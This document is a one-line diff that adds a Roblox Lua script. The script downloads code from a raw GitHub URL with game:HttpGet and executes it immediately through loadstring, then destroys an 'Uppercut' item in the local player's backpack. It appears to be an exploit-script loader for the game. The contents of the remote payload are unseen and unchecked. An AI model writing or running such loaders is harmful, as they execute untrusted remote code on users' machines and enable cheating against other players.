@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bre5be123/Ha/refs/heads/main/CUTCHAMAYRANGOAIDI"))() game.Players.LocalPlayer.Backpack.Uppercut:Destroy()
